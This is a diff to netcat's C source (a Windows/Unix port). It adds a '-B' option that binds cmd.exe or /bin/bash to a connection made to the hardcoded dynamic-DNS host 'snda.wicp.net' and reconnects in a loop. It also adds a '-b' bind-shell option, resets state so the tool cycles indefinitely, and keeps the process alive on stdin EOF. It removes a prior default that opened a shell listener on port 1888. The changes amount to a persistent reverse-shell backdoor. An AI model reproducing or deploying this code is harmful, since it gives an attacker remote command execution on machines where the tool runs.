@@ -1505,6 +1505,8 @@ static int readwrite (fd)
 #endif
 				return (1);
 			}
+
+			continue;
 		} /* select fuckup */
 		/* if we have a timeout AND stdin is closed AND we haven't heard anything
 		from the net during that time, assume it's dead and close it too. */
@@ -1610,7 +1612,9 @@ static int readwrite (fd)
 			/* (weld) this is gonna block until a <cr> so it kinda sucks */
 			rr = read (0, bigbuf_in, BIGSIZ);
 			if (rr <= 0) {			/* at end, or fukt, or ... */
-				close (0);
+				// do nothing
+				// close (0);
+				
 			} else {
 				rzleft = rr;
 				zp = (unsigned char*)bigbuf_in;
@@ -1779,6 +1783,14 @@ static void __w32_shutdown(void)
 }
 #endif
 
+void sigint_handler(int signo)
+{
+	int answer;
+	printf("Do you want to quit?(Y/N)");
+	answer = getchar();
+	if (answer == 'Y' || answer == 'y')
+		exit(0);
+}
 /* main :
 now we pull it all together... */
 int main (argc, argv)
@@ -1803,6 +1815,7 @@ int main (argc, argv)
 	USHORT curport = 0;
 	char * randports = NULL;
 	int cycle = 0;
+	int o_noint = 0;
 
 #ifdef WIN32
 	atexit(__w32_shutdown);
@@ -1849,6 +1862,18 @@ int main (argc, argv)
 
 recycle:
 	optind = 1;
+
+	whereto = NULL;
+	wherefrom = NULL;
+	ouraddr = NULL;
+	themaddr = NULL;
+	o_lport = 0;
+	ourport = 0;
+	loport = 0;		/* for scanning stuff */
+	hiport = 0;
+	curport = 0;
+	randports = NULL;
+
 #if 0
 	/* if no args given at all, get 'em from stdin and construct an argv. */
 	if (argc == 1) {
@@ -1892,30 +1917,43 @@ recycle:
 		argc = x;
 	} /* if no args given */
 #endif
-	/******* default options ********/
-	if (argc == 1) {
-		// whereto = gethostpoop ("www.example.com", o_nflag);
-#ifdef GAPING_SECURITY_HOLE
-	#ifdef WIN32
-		pr00gie = "cmd.exe";
-	#else
-		pr00gie = "/bin/bash";
-	#endif
-#endif
-		o_listen++;
-		o_keepalive = cycle = 1;
-		o_lport = 1888;
-	}
-	/******* default options ********/
 
 	/* If your shitbox doesn't have getopt, step into the nineties already. */
 	/* optarg, optind = next-argv-component [i.e. flag arg]; optopt = last-char */
-	while ((x = getopt (argc, argv, "ade:g:G:hi:klLno:p:rs:tuvw:zx")) != EOF) {
+	while ((x = getopt (argc, argv, "ab:Bde:g:G:hi:klLnNo:p:rs:tuvw:zx")) != EOF) {
 		/* Debug (("in go: x now %c, optarg %x optind %d", x, optarg, optind)); */
 		switch (x) {
 		case 'a':
 			bail ("all-A-records NIY");
 			o_alla++; break;
+		case 'b':
+#ifdef GAPING_SECURITY_HOLE
+	#ifdef WIN32
+			pr00gie = "cmd.exe";
+	#else
+			pr00gie = "/bin/bash";
+	#endif
+#endif
+			o_listen++;
+			o_keepalive = cycle = 1;
+			o_lport = getportpoop (optarg, 0);
+			if (o_lport == 0)
+				bail ("invalid local port %s", optarg);
+			break;
+
+		case 'B':
+#ifdef GAPING_SECURITY_HOLE
+	#ifdef WIN32
+			pr00gie = "cmd.exe";
+	#else
+			pr00gie = "/bin/bash";
+	#endif
+#endif
+			whereto = gethostpoop ("snda.wicp.net", o_nflag);
+			o_keepalive = cycle = 1;
+			o_interval = 200;
+			break;
+
 #ifdef GAPING_SECURITY_HOLE
 		case 'e':				/* prog to exec */
 			pr00gie = optarg;
@@ -1958,9 +1996,6 @@ recycle:
 #endif
 		case 'i':				/* line-interval time */
 			o_interval = atoi (optarg) & 0xffff;
-#ifdef WIN32
-			o_interval *= 1000;
-#endif
 			if (! o_interval)
 				bail ("invalid interval time %s", optarg);
 			break;
@@ -1970,6 +2005,9 @@ recycle:
 			o_listen++; break;
 		case 'n':				/* numeric-only, no DNS lookups */
 			o_nflag++; break;
+		case 'N':
+			o_noint = 1;
+			break;
 		case 'o':				/* hexdump log */
 			stage = (unsigned char *) optarg;
 			o_wfile++; break;
@@ -2016,6 +2054,10 @@ recycle:
 		} /* switch x */
 	} /* while getopt */
 
+	if (o_noint)
+		signal(SIGINT, sigint_handler);
+	else
+		signal(SIGINT, SIG_DFL);
 	/* other misc initialization */
 #ifndef WIN32  /* Win32 doesn't like to mix file handles and sockets */
 	Debug (("fd_set size %d", sizeof (*ding1)));	/* how big *is* it? */
@@ -2055,7 +2097,7 @@ recycle:
 	/* gonna only use first addr of host-list, like our IQ was normal; if you wanna
 	get fancy with addresses, look up the list yourself and plug 'em in for now.
 	unless we finally implement -a, that is. */
-	if (argv[optind]) {
+	if (whereto == NULL && argv[optind]) {
 		whereto = gethostpoop (argv[optind], o_nflag);
 		optind++;
 	}
@@ -2198,7 +2240,25 @@ recycle:
 	if (o_verbose > 1)		/* normally we don't care */
 		holler ("sent %d, rcvd %d", wrote_net, wrote_out);
 
-	free(randports);
+	if (randports != NULL) {
+		free(randports);
+		randports = NULL;
+	}
+
+	if (whereto != NULL) {
+		free(whereto);
+		whereto = NULL;
+	}
+
+	if (wherefrom != NULL) {
+		free(wherefrom);
+		wherefrom = NULL;
+	}
+
+	if (gates != NULL) {
+		free(gates);
+		gates = NULL;
+	}
 
 	if (cycle == 1)
 		goto recycle;
